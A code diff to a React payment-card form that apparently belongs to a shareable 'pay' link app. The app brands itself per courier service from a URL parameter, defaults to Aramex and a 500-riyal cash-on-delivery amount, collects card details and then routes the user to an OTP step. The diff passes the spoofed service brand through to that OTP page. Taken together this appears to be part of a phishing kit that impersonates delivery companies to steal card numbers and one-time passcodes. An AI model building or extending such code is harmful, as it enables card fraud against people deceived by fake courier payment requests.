@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useMemo, useEffect } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -16,6 +16,12 @@ const PaymentCardForm = () => {
   const navigate = useNavigate();
   const { toast } = useToast();
   const { data: linkData } = useLink(id);
+  const shareId = id || "";
+  const currentSearch = typeof window !== "undefined" ? window.location.search : "";
+  const urlServiceKey = useMemo(
+    () => (typeof window !== "undefined" ? new URLSearchParams(window.location.search).get('service') : null),
+    []
+  );
   
   const [cardName, setCardName] = useState("");
   const [cardNumber, setCardNumber] = useState("");
@@ -24,12 +30,19 @@ const PaymentCardForm = () => {
   
   // Get customer info from sessionStorage
   const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
-  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
+  const sessionServiceKey = typeof window !== "undefined" ? sessionStorage.getItem('serviceKey') : null;
+  const serviceKey = linkData?.payload?.service_key || linkData?.payload?.service || urlServiceKey || customerInfo.serviceKey || sessionServiceKey || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   const shippingInfo = linkData?.payload as any;
   const amount = shippingInfo?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
+
+  useEffect(() => {
+    if (serviceKey) {
+      sessionStorage.setItem('serviceKey', serviceKey);
+    }
+  }, [serviceKey]);
   
   const formatCardNumber = (value: string) => {
     const cleaned = value.replace(/\s/g, "");
@@ -117,7 +130,7 @@ const PaymentCardForm = () => {
     });
     
     // Navigate to OTP
-    navigate(`/pay/${id}/otp`);
+    navigate(`/pay/${shareId}/otp${currentSearch}`);
   };
   
   return (
